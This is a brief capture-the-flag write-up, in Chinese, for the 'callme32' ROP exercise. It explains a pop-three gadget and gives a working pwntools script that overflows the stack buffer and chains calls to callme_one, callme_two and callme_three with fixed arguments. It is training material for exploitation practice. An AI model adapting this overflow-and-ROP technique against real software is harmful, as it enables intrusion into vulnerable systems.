# callme32

pop3_addr是为了在执行完callme_one()后弹出之前传入栈中的它的3个参数，即0xdeadbeef、0xcafebabe、0xd00df00d  
 
Exp:
```python
import pwn
  
pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./callme32')
e = pwn.ELF('./callme32')

callme_one_addr = pwn.p32(e.plt['callme_one'])
callme_two_addr = pwn.p32(e.plt['callme_two'])
callme_three_addr = pwn.p32(e.plt['callme_three'])

# ROPgadget --binary callme32 | grep 'pop'
pop3_addr = pwn.p32(0x080487f9)   # pop esi ; pop edi ; pop ebp ; ret 

payload = b'A' * 0x28 + b'B' * 4 + callme_one_addr + pop3_addr + pwn.p32(0xdeadbeef) + pwn.p32(0xcafebabe) + pwn.p32(0xd00df00d)
payload += callme_two_addr + pop3_addr + pwn.p32(0xdeadbeef) + pwn.p32(0xcafebabe) + pwn.p32(0xd00df00d)
payload += callme_three_addr + pop3_addr + pwn.p32(0xdeadbeef) + pwn.p32(0xcafebabe) + pwn.p32(0xd00df00d)

#pwn.gdb.attach(p)

p.sendlineafter(b'> ', payload)

p.recv()
```